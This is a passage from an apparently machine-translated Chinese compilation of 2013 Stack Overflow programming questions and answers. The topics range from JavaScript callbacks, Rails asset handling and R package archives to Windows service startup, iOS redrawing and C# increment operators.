它是 javascript 中的 firebug 克隆，与 IE6 兼容。

从文档中，关于如何安装它：

```
<!--  Include the following code at the top of the <head> of your page -->
<script type="text/javascript" src="https://getfirebug.com/firebug-lite.js"></script> 
```

**编辑**：发现不支持调试javascript代码。无论如何，就像有人已经对你说过的评论一样，看看这个答案：[在 IE6 中调试 JavaScript](https://stackoverflow.com/questions/782689/debug-javascript-within-ie6)。

# javascript - javascript图像预加载器

> ID：15973579
> 
> 赞同：0
> 
> 时间：2013-04-12T14:11:08.630
> 
> 标签：javascript

我编写了一个小图像预加载器，看起来应该可以工作，但回调是在加载图像之前执行的。

```
function imagePreloader(src,callback) {
    var image = new Image();
    image.src = src;
    image.onLoad = callback()

}

function mainImage(gallery) {
    $('#main_image').attr('src',gallery[itterations])
    imagePreloader(gallery[0],function() {

    $('#main_image').css({opacity:1})
    firstLoad = false;
    itterations ++;
    })
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:13:19.093

```
image.onLoad = callback; 
```

代替

```
image.onLoad = callback() 
```

否则您将`callback`立即执行。

# python - 橙色 Python 数据加载错误：“无效长度示例”

> ID：15973580
> 
> 赞同：2
> 
> 时间：2013-04-12T14:11:10.723
> 
> 标签：python, orange

我正在尝试使用 python 和 Orange（机器学习包）加载 .csv 文件并出现错误。我有 208 列，但在错误中我只看到几列，之后什么也没有。错误是什么意思？

```
example of invalid length: (0 REAL P 16 0 1 0 112.11.119.78 Mozilla/5.0 (Linux; U; Android 4.0.3; zh-cn; HTC Sensation Z710e Build/IML74K) AppleWebKit/534.30 (KHTML  like Gecko) Ve android_android23 Droid Smartphone Android 4.0.3 0 1 1 0 0 0 1 Android_Phones Null Null Null Null Null Null Null Null Null Null Null Null Null Null Null wifi Null Null pyramid 0 1 1 26 0 0 0 8 0 7 0 0 0 0 0 0 0 0 0 0 Null Null Null Null en 1 CN Null FALSE ANDROID_APPLICATION ANDROID_APPLICATION 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-14T22:55:00.940

我最近在尝试将一堆数据导入 Orange 时自己解决了这个错误。我的数据的问题是某些字段信息中有逗号，Orange 数据导入器一直认为这些是额外的分隔符。尝试导入逗号和制表符分隔的数据文件时会发生这种情况。

我的解决方案是在数据文件进入 Orange 之前对其进行预处理，并将所有逗号替换为未出现在其余数据中的另一个字符，并且不会被 Orange 视为分隔符（对我来说是 ':'性格很好）。

我会说检查您的数据并确保没有可能作为额外分隔符被拾取的杂散制表符或逗号。

此外，您包含的数据是仅来自错误消息，还是您的完整数据行？

# php - 在 foreach 循环中添加链接

> ID：15973582
> 
> 赞同：-1
> 
> 时间：2013-04-12T14:11:20.187
> 
> 标签：php, javascript, mysql

所以我必须从 mysql 数据库中调用 25 篇文章，并让文章标题打开一个包含相关文章正文的模式窗口。有没有办法在 foreach 中添加一个动态引用相应文章的链接？

例如，当我点击标题“Fish Sticks Taste Horrible”时，我应该会在模态窗口中看到一篇关于难吃鱼棒的文章。

我刚开始使用 php 和 javascript，所以这一切都超出了我的想象。任何帮助将不胜感激。这就是我到目前为止所拥有的：

```
$results = $conn->query('SELECT title, byline, body, timestamp FROM PublishedDocs ORDER BY timestamp DESC LIMIT 25;');

<div class="list">
    <?php
    foreach ($results as $key) {
    echo '<a href="#" class="lightbox"><b>';print_r($key[title]); echo '</b></a>';
    echo '<p>';print_r($key[byline]); echo '</p>';
    echo '<p>';print_r($key[timestamp]); echo '</p>';
    echo '<p>';print_r($key[body]); echo '</p><br>';
    }
    ?>
</div>

<div class="backdrop"></div>
<div class="box"><div class="close">x close</div><b><?php print_r($key[title]);?></b><?php print_r($key[body]);?></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:14:00.227

就像是...

```
<?php

 foreach ($results as $key) {

   $link = "blabla".$key["title"];
   echo "<a href='$link' class='lightbox'>". $key['title'] . "</b></a>";
   ...

 }

 ?> 
```

应该管用

# ubuntu - SQLite3在Ubuntu中的安装和使用

> ID：15973589
> 
> 赞同：4
> 
> 时间：2013-04-12T14:11:34.843
> 
> 标签：ubuntu, sqlite

`SQLite3`我寻求有关在 Ubuntu（例如 Ubuntu Lucid）中的安装和使用的一些说明。在我看来，要安装它，只需要从这里下载预编译的二进制文件：[http](http://www.sqlite.org/download.html) ://www.sqlite.org/download.html ，将其保存在某个目录中，然后**使用该二进制**文件创建一个`.db`文件。然后就是这样。当然，对于实际使用，我主要通过代码中的 Python 驱动程序读取/写入它：[https](https://pypi.python.org/pypi/pysqlite) ://pypi.python.org/pypi/pysqlite 。

几个问题：

1.  以上是在Linux系统中安装SQLite3的正确方法吗？

2.  我还看到我的系统上安装了两个软件包：`libsqlite3-0`和`libsqlite3-dev`，它们的版本与最新的二进制文件不同。`.db`当我通过 Python 驱动程序读/写文件时，这些是实际使用的吗？

3.  升级 SQLite3 的正确方法是什么？我是否只是从 sqlite.org 获取最新的预编译二进制文件，然后开始使用它来访问现有`.db`文件？

# breeze - HotTowel - 以 Breeze 作为参数的过滤谓词查看 Durandal 导航

> ID：15973590
> 
> 赞同：1
> 
> 时间：2013-04-12T14:11:35.020
> 
> 标签：breeze, single-page-application, durandal, hottowel

我不清楚如何在 MVC4 SPA HotTowel 模板中实现以过滤谓词作为参数的新视图的架构导航。假设我有一个带有日期（过滤器）的下拉菜单和一个按钮“gotoSessions”来导航到会话视图。GoToSessions 按钮将导航到仅显示所选日期的会话的会话视图。不选择日期将强制会话视图显示所有可用的会话。

![添加了主视图屏幕](https://i.stack.imgur.com/uCsBk.png)

1.  更新 config.js 中的“会话”路由以接受过滤器参数

    ```
    var routes = [{
        url: 'sessions/:filter',
        moduleId: 'viewmodels/sessions',
        name: 'Sessions',
        visible: true,
        caption: '<i class="icon-book"></i> Sessions' }, {... the rest of the routes ..}]; 
    ```

2.  实现“gotoSessions”按钮

    ```
     var selectedDate = ko.observable();

     var gotoSessions = function(viewData) { 
       if (viewData && viewData.selectedDate) {
          // build filter to pass to Breeze QueryManager as where clause
          var filter = viewData.selectedDate.peek();

          // build url with filter parameter
          var url = '#/sessions/' + predicate;

          router.navigateTo(url);
       }
    }; 
    ```

3.  在 session.js 视图模型中更新 activate 方法以接受 routeData 作为参数并在 datacontext.js 服务中实现过滤

    ```
    var activate = function (context) {
       var filterParam = context.filter;

       // update datacontext getSessionsPartials method to accept filter parameter
       return datacontext.getSessionsPartials(sessions, false, filterParam ); 
    }; 
    ```

4.  在 services/datacontext.js 中更新查询以使用过滤器

    ```
    var getSpeakersPartials = function (speakersObservable, forceRemote, filter) { 
    //... code ... 
       var query = EntityQuery.from('Speakers')
         .select('id, firstName, lastName, imageSource')
         .where(... filter here ...)
         .orderBy(orderBy.speaker);
         //... rest of the code...
    };

    function getLocal(resource, filtering, ordering) {
       var query;
       if (filtering) {
          query = EntityQuery.from(resource)
               .where('yourPropertyNameHere', 'equals', filtering)
               .orderBy(ordering);
       }
       else {
           query = EntityQuery.from(resource).orderBy(ordering);
       }   
    } 
    ```

这是 MVC4 SPA HotTowel 架构的正确实现吗？您能否提供过滤器（谓词）格式的代码示例？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T14:24:16.550

让用户选择日期然后转到页面似乎是一个奇怪的用户工作流程。为什么不先进入会话页面，然后选择下拉菜单？点击次数相同，用户在会话中然后选择过滤器更有意义。该页面可能首先出现没有会话（或全部有分页）。然后选择下拉菜单并自动应用过滤器。

如果您想将参数传递给视图，您可以使用哈希标记查询字符串中的 :parm 语法来实现，但我认为重新考虑 UX 是一个更好的选择。

# javascript - 在 Rails 中将脚本从页面迁移到 js 文件

> ID：15973591
> 
> 赞同：0
> 
> 时间：2013-04-12T14:11:37.627
> 
> 标签：javascript, ruby-on-rails, jquery

我在页面中有以下脚本`show.html.erb`，以更新我的进度条。但是它使用 jQuery，并且由于 jQuery 只是在我的布局末尾加载`application.html.erb`，我不能在我的页面上使用它。所以我`show.html.erb`在脚本代码之前的页面上也需要它。

很明显，这不是正确的做法。我应该把我的脚本代码放在哪里，以便为这个页面加载它？另一个问题是它使用来自控制器的信息 ( `@batch`)。如果我将它移动到我的资产文件夹中的 js 文件中，我该如何访问它？

下面的代码放在最后`show.html.erb`

```
<%= javascript_include_tag "application" %>

<script type="text/javascript">
function progress(){
    var progress = setInterval(function() {
      var $bar = $('.bar');
      var $pct = $('#pct');
      $.get("<%= @batch.id %>/status.json", function(data){
        if (data.status == "done") {
          location.reload();
        } else {
          $bar.width(data.progress+"%");
          $pct.text(data.progress+"%");
        }
      });
    }, 800);
}

$(document).ready(function() {
  $.get("<%= @batch.id %>/status.json", function(data) {
    if (data.status == "processing") {
      progress();
    }
  });
});
</script> 
```

**编辑**

由于现在我得到了 batch_id，我可以检查它是否存在来运行代码：

```
$(document).ready(function() {
  var batch_id = $("#batch").data("batch-id");
  if (batch_id != null) {
    $.get(batch_id + "/status.json", function(data) {
      if (data.status == "processing") {
        progress();
      }
    });
  }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:30:03.423

处理此问题的方法是通过**不显眼的 javascript**（将您的 javascript 与 html 分开）。

首先，移动文件部分中的`<%= javascript_include_tag "application" %>`，以便在每个页面上正确加载 jquery。`<head>``application.html.erb`

然后，将脚本移动到资产目录中的 js 文件中。

要访问，请在视图文件 ( )`@batch.id`中的数据属性中添加此 id 。`show.html.erb`

```
<div id="etc" data-batch-id="<%= @batch.id %>"></div> 
```

然后，在您的脚本中：

```
var batch_id = $("#etc").data("batch-id")
$.get(batch_id + "/status.json", ... 
```

# r - 如何在 R 3.0.0 上构建存档包

> ID：15973594
> 
> 赞同：6
> 
> 时间：2013-04-12T14:11:52.537
> 
> 标签：r

最近推出了 R 3.0.0。 [其中一项要求](http://mac.softpedia.com/progChangelog/R-for-Mac-OS-X-Changelog-16023.html)是“*需要（重新）在 R 的此版本（3.0.0）下安装包。* ”

当您有已归档的软件包时会出现此问题。以独立于操作系统的方式，您如何构建像[uroot](http://cran.r-project.org/web/packages/uroot/)这样的包？如您所见，包已存档。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-12T14:27:52.480

从存档构建包的最简单方法是使用 devtools：

```
library(devtools)
install_url("http://cran.r-project.org/src/contrib/Archive/uroot/uroot_1.4.tar.gz") 
```

存在三个挑战：

*   你需要有一个工作的开发环境。在 Windows 上，这意味着您需要 Rtools；在 mac 上，xcode 命令行工具；在 linux 上，适当的开发包

*   devtools 目前存在一个错误，这意味着它在 Windows 上找不到正确版本的 Rtools。正在向 CRAN 进行修复。

*   将包放入存档通常是有充分理由的：它可能没有通过`R CMD check`当前版本的 R，因此即使您安装了它，它也可能无法正常工作。当心！

# javascript - 使用 javascript 和 regEx 将表情符号的路径替换为其 unicode

> ID：15973604
> 
> 赞同：2
> 
> 时间：2013-04-12T14:12:20.427
> 
> 标签：javascript, regex

我面临一个关于用它的 unicode 替换表情符号路径的问题。我想使用 RegEx 功能。我的意思是我想替换：

```
teststring<img src=":/new/emoji/emoji/emoji-E057.png" />thanks<img src=":/new/emoji/emoji/emoji-E415.png" /> 
```

和

```
teststring\uE057thanks\uE415 
```

请注意，\uE057 和 \uE415 是 2 个 unicode 字符。任何人都可以帮助我解决这个问题。

最好的祝福。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:23:30.650

```
var str = 'teststring<img src=":/new/emoji/emoji/emoji-E057.png" />thanks<img src=":/new/emoji/emoji/emoji-E415.png" />',
    div = document.createElement("div"),
    imgs,
    regex = /emoji-([a-f0-9]{4})\.png$/i;

div.innerHTML = str;

imgs = [].slice.call( div.getElementsByTagName("img") );

for( var i = 0; i < imgs.length; ++i ) {
    var m = imgs[i].src.match(regex);

    if( m ) {
        imgs[i].parentNode.replaceChild(
            document.createTextNode(
                String.fromCharCode(parseInt(m[1], 16))
            ), 
            imgs[i]
        );
    }
}

var result = div.innerText || div.textContent || "";
//"teststringthanks" 
```

# c# - 在 Linux 上运行 Dot Net 项目 exe，它利用 System.Management 获取 USB 设备信息

> ID：15973610
> 
> 赞同：1
> 
> 时间：2013-04-12T14:12:33.633
> 
> 标签：c#, .net, linux, mono, system.management

嗨，我在 C# 中创建了一个 Dot Net 应用程序，以使用 System.Management 命名空间获取 USB 设备信息，如 DeviceID、Caption、ClassGUID 等。我正在使用 ManagementObjectSearcher 方法从 Win32_DiskDrive 获取值。它在 Windows 上运行良好。我想在 Linux 机器上运行它。您可以使用 Mono 在 Linux 机器上运行 Dot Net 应用程序。

[http://mono-project.com/Main_Page](http://mono-project.com/Main_Page)

当我使用 Mono 在 Linux 上运行我的应用程序的 exe 时，我收到以下错误：

```
 Missing method .ctor in assembly /home/dvimay11/USBCamInfoNew/Debug/System.Management.dll, type System.Reflection.AssemblySignatureKeyAttribute
Can't find custom attr constructor image: /home/dvimay11/USBCamInfoNew/Debug/System.Management.dll mtoken: 0x0a000009

Unhandled Exception: System.TypeLoadException: Could not load type 'System.Reflection.AssemblySignatureKeyAttribute' from assembly 'System.Management'.
  at USBCamInfo.USBInfo.GetUSBDevices () [0x00000] in <filename unknown>:0 
  at USBCamInfo.USBInfo.LoadUSBInfo () [0x00000] in <filename unknown>:0 
  at USBCamInfo.USBInfo..ctor () [0x00000] in <filename unknown>:0 
  at (wrapper remoting-invoke-with-check) USBCamInfo.USBInfo:.ctor ()
  at USBCamInfo.Program.Main () [0x00000] in <filename unknown>:0 
[ERROR] FATAL UNHANDLED EXCEPTION: System.TypeLoadException: Could not load type 'System.Reflection.AssemblySignatureKeyAttribute' from assembly 'System.Management'.
  at USBCamInfo.USBInfo.GetUSBDevices () [0x00000] in <filename unknown>:0 
  at USBCamInfo.USBInfo.LoadUSBInfo () [0x00000] in <filename unknown>:0 
  at USBCamInfo.USBInfo..ctor () [0x00000] in <filename unknown>:0 
  at (wrapper remoting-invoke-with-check) USBCamInfo.USBInfo:.ctor ()
  at USBCamInfo.Program.Main () [0x00000] in <filename unknown>:0 
```

谁能帮我解决这个问题。我想知道如何使用 System.Management 命名空间在 Linux 机器上运行我的 Dot Net exe 来检索 USB 设备的信息

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:40:30.833

如果您查看[Mono 项目路线图](http://www.mono-project.com/Mono_Project_Roadmap#Unsupported_technologies)，您会发现它`System.Management`是特定于 Windows 的，并且没有计划支持它。

您可以改用[SharpUsbLib](http://www.icsharpcode.net/OpenSource/SharpUSBLib/default.aspx)，它支持 Linux 下的 USB。

# c# - windows服务启动时如何运行任务？

> ID：15973611
> 
> 赞同：6
> 
> 时间：2013-04-12T14:12:33.723
> 
> 标签：c#, .net, windows-services, installutil, onstart

我有一个 Windows 服务，并且我已经编写了在 OnStart() 事件中运行任务的代码：

```
 protected override void OnStart(string[] args)
        {
            this.DoTask();
        }

private void DoTask()
        {
            Task task1 = Task.Factory.StartNew(() => this.OriginalFileProcessor.StartPolling());

            try
            {
                Task.Wait(task1);
            }
            catch (Exception ex)
            {
                this.Log.Error("Failed running the task", ex);
            }           
        } 
```

DoTask 是一个永无止境的循环。只有在服务停止时才会停止。

但是当我尝试启动服务时，它会等待很长时间，然后给我以下错误：

```
Windows could not start the ... service on Local Computer.
Error 1053: The service did not respond to the start or control request in a timely fashion. 
```

如何解决？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-12T14:16:17.927

你为什么要等你的任务完成？

我认为`Task.Wait`正在阻塞您当前的线程，然后您在启动服务时会超时。

编辑：您需要删除此块：

```
try
{
    Task.Wait(task1);
}
catch (Exception ex)
{
    this.Log.Error("Failed running the task", ex);
} 
```

`Task.Wait`确实阻塞了您当前的线程。根据[MSDN](http://msdn.microsoft.com/en-us/library/dd235635.aspx)：

> 任务.等待方法
> 
> 等待任务完成执行。

**编辑 2**改为这样做

```
Task task1 = Task.Factory.StartNew(() => this.OriginalFileProcessor.StartPolling()).ContinueWith( t =>
{
     var aggException = t.Exception.Flatten();
     foreach(var ex in aggException.InnerExceptions)
         this.Log.Error("Failed running the task", ex);
}, 
TaskContinuationOptions.OnlyOnFaulted); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:17:58.220

我想这是因为您正在等待`OriginalFileProcessor.StartPolling()`结束，但这永远不会发生。您应该将您的任务实例移动到一个单独的成员中，而不是等待它完成：

```
private Task m_task = null;

private void DoTask()
{
    try
    {
        m_task = Task.Factory.StartNew(() => this.StartPolling());
    }
    catch
    {
        this.Log.Error("Unable to start task", ex);
        throw;  // Rethrow, so that the OS knows, there was something wrong.
    }           
}

private void StartPolling()
{
    try
    {
        this.OriginalFileProcessor.StartPolling();
    }
    catch (Exception ex)
    {
        this.Log.Error("Failed running the task", ex);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:14:49.190

在循环中，您需要检查服务状态是否为“停止”并退出循环。在操作系统决定杀死您之前，您有 5 秒钟的时间来执行此操作。

# ios - setNeedsDisplay 不刷新屏幕

> ID：15973619
> 
> 赞同：0
> 
> 时间：2013-04-12T14:13:04.053
> 
> 标签：ios, objective-c, drawrect, lag, setneedsdisplay

每次我用**setNeedsDisplay调用****drawRect**时，我都会显示大量图像。**问题是每次我调用dracRect**时都会导致滞后，我会重绘每张图像（数千张）。

 ****有没有办法不重绘所有图像。我的意思是，保留所有图像并绘制我想要绘制的图像？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:16:07.883

避免重绘所有内容的一种方法是调用`setNeedsDisplayInRect:`而不是`setNeedsDisplay:`，并且只传递一个包含需要重绘的图像的矩形。当然，这意味着您`drawRect`不能再忽略传入的矩形：查看图像，并检查图像是否与正在重绘的矩形重叠。如果没有重叠，请跳过图像并在重绘时节省一些 CPU 时间。

请注意，这是维护视图的一种非常“手动”的方式。考虑使用 iOS 为您提供的一些组件，例如`UICollectionView`，它可以让您用很少的代码在屏幕上显示很多东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:14:28.423

您必须将内容拆分为多个视图或层 ( `CALayer`)。然后只重绘其内容实际需要更改的视图或图层。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:17:23.223

将视图拆分为不同的视图（或图层），这将使系统能够缓存其内容并更快地重绘。

我不知道您的用例，但有数百张图像，我会考虑使用 OpenGL。****

# iphone - 没有视网膜图像的新应用程序提交

> ID：15973620
> 
> 赞同：1
> 
> 时间：2013-04-12T14:13:04.807
> 
> 标签：iphone, app-store, retina-display, submission

我有一个与 Apple 发布的关于应用提交的新闻相关的查询。这是否意味着对于下一个应用程序更新

1.  我必须为我的应用程序中的每个图像都包含视网膜和非视网膜图像？

2.  或者我可以选择性地添加视网膜图像并保持其余图像非视网膜吗？

3.  由于在应用程序中捆绑了视网膜和非视网膜图像会增加应用程序的大小，并且提交的应用程序的大小有限制（50 MB），如果大小超过限制我该怎么办？

链接：- [https://developer.apple.com/news/index.php?id=3212013b](https://developer.apple.com/news/index.php?id=3212013b)

它说 -

从 5 月 1 日开始，必须为配备 Retina 显示屏的 iOS 设备构建提交到 App Store 的新应用程序和应用程序更新，并且 iPhone 应用程序还必须支持 iPhone 5 上的 4 英寸显示屏。通过查看 iOS 人机界面指南了解如何准备应用程序.

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T17:43:40.397

这是一项艰巨的任务，但您应始终尝试将您的应用程序保持在 Apple 指南范围内，以使您的应用程序获得批准。

1.  对于所有应用程序，您应该同时拥有 image.png、image@2x.png 和 image-568h@2x.png（如果需要）。您可以只使用@2x.png 图像，并以 50% 的比例使用它。虽然在 3G、3GS 等设备上查看时会模糊图像。您可以做的是更好地压缩图像。对于 .jpg，有一些很棒的压缩工具。对于 .png，您可以使用[tinypng 之](http://tinypng.org)类的东西，它们在压缩图像和保持质量方面做得很好。我已经在几个应用程序上使用了它。

2.  与上述相同，如果您想要满意的客户并确保在提交应用程序时不会被拒绝，您应该尽量保持良好的 HIG 实践。如果您使用非视网膜图像，它们将被放大，并且在 4、4S 或 5 上看起来都不会很好。

3.  正如其他人在我之前所说的那样。Apple 确实批准超过 50mb 的应用程序，它们只是不会通过 3G 下载。

    引自[指南](https://developer.apple.com/appstore/resources/approval/guidelines.html)。

> **2.15**大小超过 50MB 的应用程序将无法通过蜂窝网络下载（App Store 自动禁止此操作）

# java - 从字符串中获取不同的值并将它们转换为双精度值

> ID：15973624
> 
> 赞同：0
> 
> 时间：2013-04-12T14:13:16.733
> 
> 标签：java, arrays, string, double

在我的代码中，我要求用户输入三个不同的值除以空格。然后，我想将这三个不同的值分配给三个不同的**Double**变量。

我尝试将此类字符串的第一个字符分配给我的双变量，但我未能成功。

有什么建议么？

谢谢！

这是我正在尝试做的事情：

```
int decision = message();
String newDimensions;
double newHeight, newWidth, newLength;

if(decision == 1){
  newDimensions = JOptionPane.showInputDialog("Please enter the desired amount to be added" + 
                                            "\nto each dimension." +
"\nNOTE: First value is for Height, second for Width, third for Length" +
"\nAlso, input information has to have a blank space between each value." +
"\nEXAMPLE: 4 8 9");

newHeight = Double.parseDouble(newDimensions.charAt(0)); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:16:02.273

1.  接受用户的输入。

2.  使用分隔符空间分割那条线，即“”。

3.  在 for 循环内部将每个索引元素更改为双精度。通过使用 Double.parseDouble(splitted[i]);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:15:07.067

您可以首先使用[String.split](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String%29)拆分输入，然后使用 Double.parseDouble [Double.parseDouble](http://docs.oracle.com/javase/7/docs/api/java/lang/Double.html#parseDouble%28java.lang.String%29)解析每个变量以将它们读入 Double 变量。

```
String[] params = newDimensions.split(" ");
newHeight = Double.parseDouble(params[0]);
newWidth = Double.parseDouble(params[1]); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:16:14.993

获取输入，用空格分割并解析每个 Double。此代码不会清理输入。

```
 String input = "12.4 19.8776 23.3445";
        String[] split = input.split(" ");
        for(String s : split)
        {
            System.out.println(Double.parseDouble(s));
        } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T14:14:36.707

[**Double#parseDouble(str)**](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Double.html#parseDouble%28java.lang.String%29)需要一个字符串，而您正在尝试传递一个字符。

试试这个：

```
newHeight = Double.parseDouble(newDimensions.subString(1)); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-12T14:17:59.950

尝试这样的事情：

```
newDimensions = JOptionPane.showInputDialog(...

newDimensions = newDimensions.trim();

String arr[] = newDimensions.split(" ");

double darr[] = new double[arr.length];

for(int i=0;i<arr.length;i++) darr[i] = Double.parseDouble(arr[i].trim()); 
```

仍有一些防御性问题可以解决。对您的 parse double 进行修剪是至关重要的。

# jquery - jquery .load() 没有在创建的 div 中加载下一个外部文件

> ID：15973627
> 
> 赞同：1
> 
> 时间：2013-04-12T14:13:19.493
> 
> 标签：jquery, html, jquery-mobile, jquery-load

所以，我正在尝试实现一个加载函数，该函数将从我的应用程序的第一页执行 jquery 代码，以包括在该页面上加载的页面.. 即 page1.html 有一个 id="content" 的空 div我希望它在我的根文件夹中填充另一个外部页面..我尝试了以下...

```
 $(document).ready(function() {  
$('input').click(function() {  
$.ajax({
  url: "./page2.html",
  type: "GET"
  }).done(function(response, status, xhr) {
  $("#div1").html(response);
  alert(status + " : " + xhr) 
  }); 
 }); 
}); 
```

和 HTML 页面

```
<!DOCTYPE html>
<html manifest="cache.manifest">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <title>my Page</title>
  <link rel="stylesheet" href="javascript/jquery.mobile-1.3.1/jquery.mobile-1.3.1.min.css" />
  <script src="javascript/jquery.mobile-1.3.1/jquery-1.9.1.min.js"></script>
  <script src="javascript/jquery.mobile-1.3.1/jquery.mobile-1.3.1.min.js"></script>
  <link rel="stylesheet" href="my.css" />
  <script src="my.js"></script>
</head>
 <body>
     <!-- Question1 -->
    <div id="question1" data-role="page" class="questionContainer radius" data-theme="b">
      <div id="hbox" data-theme="b" data-role="header">
          <a id="bb1" class="back_button" data-role="button" data-theme="a" href="index.html" data-icon="arrow-l" data-iconpos="left">
                  Back
               </a>
              <a id="hb1" data-role="button" data-theme="a" href="app-help.html" data-icon="info"
          data-iconpos="right" class="ui-btn-right">
               Help
           </a>
         <h3 id="q1">
               Question 1
         </h3>
       </div>
       <div class="question"><h3>Q1:is this even right?</h3></div>
          <h3 id="c1" style="border:solid;">
              What Ever is the Question!
           </h3>
            <div id="rb1" data-role="fieldcontain" class="answers">
               <fieldset data-role="controlgroup" data-type="vertical">
                   <legend>
                       Choose:
                   </legend>
                   <ul>
                     <li><input id="q1-a" class="a1" name="Radio Buttons" value="radio1" type="radio"/> 
                     <label for="q1-a">
                       Yes.
                      </label></li>
                     <li><input id="q1-b" class="b1" name="Radio Buttons" value="radio2" type="radio"/>
                <label for="q1-b">
                  No.
                </label></li>
              </ul>
          </fieldset>
      </div>
    <div class="btnContainer">
            <div id="next1">
                <input id="next1" class="next" type="button" data-inline="true" data-theme="a" value="Next" data-icon="arrow-r" data-iconpos="right"/>
            </div>
        </div>
 <div id="fbox" data-theme="b" data-role="footer" data-position="fixed">
    <span class="ui-title">
         </span>
       </div>
    </div>
    <div id="div1"></div>

  </body>
 </html> 
```

好的...更新，我尝试了网络上的许多答案，但没有一个像我想要的那样在 div 中显示第二页..它正在获取它，但没有显示它..我还删除了一大块 jQuery假设捕获用户的结果并在最后计算分数..但由于某种原因，这段代码导致页面没有得到任何东西，但是，当我删除代码时..当我再次显示第一页时单击下一个按钮..但格式混淆...再次萤火虫向我显示我正在获得第二页..但显示第一页..感谢帮助:)有人建议我这可能是干扰我的 ajax 的 jQuery 或 CSS .. 我的意思是..我不知道该怎么做 .. 无论如何.. 非常感谢您之前的帮助..！

米

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:34:33.820

这个怎么样？当您只想将内容加载到您的 div 中时，您似乎做了很多额外的事情。

```
<script type="text/javascript">
$(document).ready(function() {  // load document 
    $.ajax({
      url: "page2.html",
      context: document.body
    }).done(function(response, status, xhr) {
      $("#content").html(response);
      alert(status + " : " + xhr) //alert me with the server response, status
    }); 
});
</script> 
```

如果您确实需要在单击事件上发生这种情况，请将其移动到单击事件中。

```
$(document).ready(function() {  // load document 
 $('.next').click(function() {  //use the class of "next" when clicked and ...
    $.ajax({
      url: "page2.html",
      context: document.body
    }).done(function(response, status, xhr) {
      $("#content").html(response);
      alert(status + " : " + xhr) //alert me with the server response, status
    }); 
  }); 
 });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:31:31.557

我能发现的是你试图在元素本身上调用 create 。

当您调用`$('this')`（$(this) 用于引用“当前元素”）时，您应该在调用`.trigger('create');`创建新 div 时引用父元素。在这种情况下，父元素似乎是`$('.next')`.

您的代码将是：

```
$('.next').click(function() { 
  var amaparent = $(this);
  $("#content").load("page2.html", function(response, status, xhr) {
   amaparent.trigger('create');
  }); 
 }); 
```

# c# - C# post increment and pre increment

> ID：15973628
> 
> 赞同：4
> 
> 时间：2013-04-12T14:13:22.280
> 
> 标签：c#, .net

I get very confused at times with the shorthand increment operation.

Since when i was little programming in BASIC, i got some how stuck with a = a+1 which is long painful way of saying 'Get a's current value, add 1 to it and then store the new value back to a'.

```
1] a = a +1 ; 

2] a++ ;

3] ++a;

4] a +=1; 
```

[1] and [4] are similar in functionality different in notation, right?

2] and 3] work simply differently because of the fact that the increment signs ++ is before and after. Right?

Am I safe to assume the below?

```
int f(int x){ return x * x;}

y = f(x++) -> for x =2, f(x) = x^2

f(x)     ======> y= 2^2 =4 

x=x+1;   ======> x= 2+1 = 3 

y = f(++x) -> for x =2, f(x) = x^2

x=x+1    ===========> x = 2+1 = 3

f(x)     ===========> y =3^2 = 9 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-12T14:19:37.813

Difference is, what the operator returns:

The *post*-increment operator "a plus plus" adds one, and returns the **old** value:

```
int a = 1;
int b = a++;
// now a is 2, b is 1 
```

The *pre*-increment operator "plus plus a" adds one, and returns the **new** value:

```
 a = 1;
    b = ++a;
// now a is 2 and b is 2 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-12T14:46:48.450

First off, you should read this answer *very carefully*:

[What is the difference between i++ and ++i?](https://stackoverflow.com/questions/3346450/what-is-the-difference-between-i-and-i/3346729#3346729)

And read this blog post *very carefully*:

[http://blogs.msdn.com/b/ericlippert/archive/2011/03/29/compound-assignment-part-one.aspx](http://blogs.msdn.com/b/ericlippert/archive/2011/03/29/compound-assignment-part-one.aspx)

Note that part two of that post was an April Fool's joke, so don't believe anything it says. Part one is serious.

Those should answer your questions.

When you have just an ordinary local variable, the statements `x++; ++x; x = x + 1; x += 1;` are all basically the same thing. But as soon as you stray from ordinary local variables, things get more complicated. Those operations have subtleties to them.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:19:15.167

1], 3] and 4] are functionally identical - `a` is incremented by one, and the value of the whole expression is the **new** value of `a`.

2] is different from the others. It also increments `a`, but the value of the expression is the **previous** value of `a`.

# ruby-on-rails - 使用 Rspec + FactoryGirl 测试嵌套资源的“创建”操作

> ID：15973634
> 
> 赞同：0
> 
> 时间：2013-04-12T14:13:46.577
> 
> 标签：ruby-on-rails, rspec, factory-bot

